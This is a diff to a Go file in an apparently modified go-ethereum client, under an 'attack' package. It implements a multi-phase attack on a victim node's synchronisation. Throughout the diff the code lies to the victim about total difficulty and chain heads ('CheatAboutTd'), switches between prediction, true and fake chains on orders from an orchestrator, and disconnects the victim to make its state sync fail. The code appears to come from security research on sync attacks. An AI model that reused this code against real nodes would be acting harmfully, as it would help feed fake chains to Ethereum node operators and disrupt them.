@@ -7,10 +7,11 @@ import "time"
 import "sync"
 import "encoding/binary"
 import "runtime"
+// import "runtime/debug"
 import "github.com/ethereum/go-ethereum/p2p"
 import "github.com/ethereum/go-ethereum/ethdb"
 import "github.com/ethereum/go-ethereum/core/types"
-//import "github.com/ethereum/go-ethereum/common"
+import "github.com/ethereum/go-ethereum/common"
 import "github.com/ethereum/go-ethereum/attack/msg"
 import "github.com/ethereum/go-ethereum/attack/utils"
 
@@ -43,7 +44,9 @@ var avoidVictim bool			// Despite we need to only avoid connecting to the victim
 								// accept/dial any new p2p peer.
 var lastOracleBit bool
 var terminatingStateSync bool
-//var servedAccounts *big.Int
+var announcedSyncTD *big.Int
+var skeletonStart uint64
+var fixedHead uint64
 
 
 
@@ -151,14 +154,21 @@ func SetVictimIfNone(v *p2p.Peer) {
 		}
 		if attackPhase == utils.ReadyPhase {
 			attackPhase = utils.PredictionPhase
-			err := sendMessage(msg.SetAttackPhase.SetContent([]byte{byte(utils.PredictionPhase)}))
+			err := sendMessage(msg.SetAttackPhase.SetContent([]byte{byte(attackPhase)}))
 			if err != nil {
 				Close()
-				fatal(err, "Could not announce victim ID to orchestrator")
+				fatal(err, "Could not announce new phase to orchestrator")
 			}
 		} else if attackPhase == utils.PredictionPhase && lastOracleBit {
 			attackPhase = utils.SyncPhase
 			log("Switched to", attackPhase, "phase")
+			/*
+			err := sendMessage(msg.SetAttackPhase.SetContent([]byte{byte(attackPhase)}))
+			if err != nil {
+				Close()
+				fatal(err, "Could not announce new phase to orchestrator")
+			}
+			*/
 		}
 
 		log("Set victim:", vID)
@@ -352,12 +362,19 @@ func ServedLastRangeQuery() {
 	To do so, we disconnect from the victim.
 	*/
 
-	if !master {
-		victimLock.Lock()
-		terminatingStateSync = true
-		victim.Disconnect(p2p.DiscUselessPeer)		// Is this enough to make the victim immediately fail the syncOp?
-		victimLock.Unlock()
-	}
+	// For now, we wait for the phase to switch to sync. Later on, this function should be automatically
+	// called when the phase has already switched. Thus, the goroutine may become unnecessary.
+	go func() {
+		for attackPhase != utils.SyncPhase {
+			time.Sleep(100*time.Millisecond)
+		}
+		if !master {
+			victimLock.Lock()
+			terminatingStateSync = true
+			victim.Disconnect(p2p.DiscUselessPeer)		// Is this enough to make the victim immediately fail the syncOp?
+			victimLock.Unlock()
+		}
+	}()
 }
 
 /*
@@ -411,6 +428,17 @@ func DoingPredictionOrReady() bool {
 	}
 }
 
+func DoingSync() bool {
+	select {
+	case <-quitCh:
+		fatal(utils.BridgeClosedErr, "Could not determine if attack phase is prediction")
+		return false
+		
+	default:
+		return (attackPhase==utils.SyncPhase)
+	}
+}
+
 func GetChainDatabase(chainType utils.ChainType) ethdb.Database {
 	select {
 	case <-quitCh:
@@ -430,21 +458,21 @@ func SetTrueChain(db ethdb.Database) {
 	setChainDatabase(db, utils.TrueChain)
 }
 
-func CheatAboutTd(peerID string, peerTD *big.Int) (*big.Int, bool, error) {
+func CheatAboutTd(peerID string, peerTD *big.Int) (*big.Int, bool, *common.Hash, error) {
 	select {
 	case <-quitCh:
-		return nil, false, utils.BridgeClosedErr
+		return nil, false, nil, utils.BridgeClosedErr
 		
 	default:
 		//Don't do anything if we are not ready yet
 		if attackPhase==utils.StalePhase {
-			return nil, false, nil
+			return nil, false, nil, nil
 		}
 
 		// Don't cheat to other malicious peers!
 		if IsMalicious(peerID) {
 			log("Not cheating about TD to peer", peerID)
-			return nil, false, nil
+			return nil, false, nil, nil
 		}
 
 		/*	Don't cheat to nodes already in sync.
@@ -464,17 +492,19 @@ func CheatAboutTd(peerID string, peerTD *big.Int) (*big.Int, bool, error) {
 																		// it already needs to announce the TD for
 																		// the syncPhase.
 			predictionTD := getTd(utils.PredictionChain)
+			log("Prediction TD in database:", predictionTD)
 			if peerTD.Cmp(predictionTD) > 0 {
-				return nil, false, nil
+				return nil, false, nil, nil
 			}
 			log("Cheating to peer", peerID, "if necessary at this point")
-			return higherTd, mustCheatAboutTd, nil
+			head := latest(utils.PredictionChain).Hash()
+			return higherTd, mustCheatAboutTd, &head, nil
 		}
 
 		// Below this point, we are already in some later stage of the attack. Therefore, we have to cheat
 		// only to our victim.
 		if peerID != victimID {
-			return nil, false, nil
+			return nil, false, nil, nil
 		}
 
 		// From here on, it is implicit that we are dealing with the victim.
@@ -482,12 +512,16 @@ func CheatAboutTd(peerID string, peerTD *big.Int) (*big.Int, bool, error) {
 		if (attackPhase == utils.PredictionPhase && lastOracleBit) ||
 		   (attackPhase == utils.SyncPhase && !terminatingStateSync) {
 				td := new(big.Int).Add(getTd(utils.TrueChain), utils.DifficultySupplement)
-				return td, mustCheatAboutTd, nil
+				log("True TD in database (+suppl.):", td)
+				head := latest(utils.TrueChain).Hash()
+				announcedSyncTD = td
+				return td, mustCheatAboutTd, &head, nil
 		}
 
 		if (attackPhase==utils.SyncPhase && terminatingStateSync) || attackPhase == utils.DeliveryPhase {
 			td := getTd(utils.FakeChain)		// For now, I am assuming the fake chain has the total difficulty
 												// from genesis and not just the difficulty of the fake segment.
+			head := latest(utils.FakeChain).Hash()
 
 			go func() {
 				err := sendMessage(msg.TerminatingStateSync)
@@ -496,10 +530,10 @@ func CheatAboutTd(peerID string, peerTD *big.Int) (*big.Int, bool, error) {
 				}
 			}()
 
-			return td, mustCheatAboutTd, nil
+			return td, mustCheatAboutTd, &head, nil
 		}
 	}
-	return nil, false, nil // This line should never be hit
+	return nil, false, nil, nil // This line should never be hit
 }
 
 /*
@@ -519,7 +553,7 @@ func GetHigherHeadAndPivot() (*types.Header, *types.Header) {
 }
 */
 
-func BatchExists(from uint64) bool {
+func PredictionBatchExists(from uint64) bool {
 	if (from-1)%utils.BatchSize != 0 {
 		fatal(utils.ParameterErr, "Error: passed batch does not start with a multiple of", utils.BatchSize)
 	}
@@ -545,8 +579,19 @@ func MustChangeAttackChain() (bool, utils.ChainType) {
 	return result, ct
 }
 
-func MustUseAttackChain() bool {
-	if victimID != "" && (attackPhase==utils.ReadyPhase || attackPhase==utils.PredictionPhase) {
+func MustUseAttackChain(query *GetBlockHeadersPacket) bool {
+	if victimID == "" {
+		return false
+	}
+
+	// When switching from prediction to sync phase, the first master of the sync phase must
+	// already use the honest chain to provide the head and pivot at the start of the syncOp.
+	// However, it will also receive queries of the previous syncOp which is still malicious,
+	// so we can't tell whether to use the attack chain simply by checking the phase.
+	if attackPhase==utils.PredictionPhase && lastOracleBit && query.Reverse && query.Amount == 2 {
+		return false
+	}
+	if (attackPhase==utils.ReadyPhase || attackPhase==utils.PredictionPhase) {
 		return true
 	}
 	return false
@@ -560,10 +605,12 @@ func SendOracleBit(bit byte) {
 	}
 	log("Sent oracle bit", bit)
 
+	/*
 	if lastOracleBit {
 		attackPhase = utils.SyncPhase
 		log("Switched to", attackPhase, "phase")
 	}
+	*/
 }
 
 
@@ -582,8 +629,9 @@ func LastPartialBatch(from uint64) bool {
 }
 
 
-func Latest() *types.Header {
+func Latest(chainTypeArg ...utils.ChainType) *types.Header {
 	chainType := attackPhase.ToChainType()
+
 	if chainType == utils.InvalidChainType {
 		/*
 		fatal(utils.ParameterErr, "Trying to get latest block while attack is stale")
@@ -630,6 +678,10 @@ func WaitBeforePivoting() {
 
 func PivotingServed() {
 	log("Pivoting request served")
+	if attackPhase == utils.PredictionPhase && lastOracleBit {
+		//attackPhase = utils.SyncPhase
+		//log("Switched to", attackPhase, "phase")
+	}
 	if attackPhase == utils.PredictionPhase || (attackPhase == utils.SyncPhase && terminatingStateSync) {
 		canDisconnect <- true
 	}
@@ -640,6 +692,35 @@ func WaitBeforeLastFullBatch() {
 	time.Sleep(500*time.Millisecond)
 }
 
+func SetAnnouncedSyncTD(td *big.Int) {
+	announcedSyncTD = td
+}
+
+func SetSkeletonStart(start uint64) {
+	skeletonStart = start
+}
+
+func StopMoving() bool {
+	headNumber := latest(utils.TrueChain).Number.Uint64()
+
+	if attackPhase != utils.SyncPhase {
+		return false
+	}
+
+	// Should work with ... >= 88 as well, but doesn't make a big difference
+	if getTd(utils.TrueChain).Cmp(announcedSyncTD) >= 0 && (headNumber - skeletonStart)%utils.BatchSize > 88 {
+		if fixedHead == 0 {
+			fixedHead = headNumber
+		}
+		return true
+	}
+	return false
+}
+
+func FixedHead() uint64 {
+	return fixedHead
+}
+
 
 func Close() {
 	quitLock.Lock()
@@ -648,7 +729,6 @@ func Close() {
 	default:
 		close(quitCh)
 		close(incoming)
-		//close(outgoing)
 		conn.Close()
 	}
 	quitLock.Unlock()
@@ -715,6 +795,11 @@ func handleMessages() {
 				default:
 				}
 				higherTd.Add(higherTd, bigOne)
+
+				if attackPhase == utils.PredictionPhase && lastOracleBit {
+					attackPhase = utils.SyncPhase
+					log("Switched to", attackPhase, "phase")
+				}
 				avoidVictim = false
 				victimLock.Unlock()
 			case msg.NewMaliciousPeer.Code:
